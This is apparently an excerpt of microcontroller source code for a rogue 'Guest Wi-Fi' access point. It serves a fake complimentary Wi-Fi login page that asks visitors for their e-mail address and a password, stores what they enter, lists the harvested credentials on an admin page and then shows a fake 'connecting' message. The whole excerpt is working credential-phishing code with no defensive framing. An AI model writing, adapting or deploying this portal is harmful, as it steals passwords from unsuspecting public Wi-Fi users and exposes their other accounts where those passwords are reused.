...
#define SUBTITLE "Complentary Wi-Fi"
#define TITLE "Authorized Guests Only"
#define BODY "To use the complementy Wi-Fi, share your e-mail address and set a password you'll remember for your next session."
#define POST_TITLE "Connecting..."
#define POST_BODY "Your session is being saved. Please, wait until the connection process completes. You should be connected to the free Wi-Fi in a moment. </br> Thank you."
...
const char *SSID_NAME = "Guest Wi-Fi";
...
String footer()
{
  return "</div><div class=q><a>&#169; Wi-Fi Partners 2023 - All rights reserved.</a></div>";
}
...
String index()
{
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>E-mail Address:</label>" +
         "<input type=text name=n><label>Password:</label><input type=password name=m></input><input type=submit value=Start></form>" + footer();
}
...
String posted()
{
  String user = input("n");
  String pass = input("m");
  user = "<li><b>User: " + user + "</li></b>"; // Adding user in a ordered list.
  pass = "<li><b>Password: " + pass + "</li></b>"; // Adding password in a ordered list.
  allPass += user;                       // Updating the full passwords.
  allPass += pass; 
...
String pass()
{
  return header(PASS_TITLE) + "<ul>" + allPass + "</ul><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}
...
String clear()
{
  ...
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>Thank you - now connecting you to your free Wi-Fi.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}
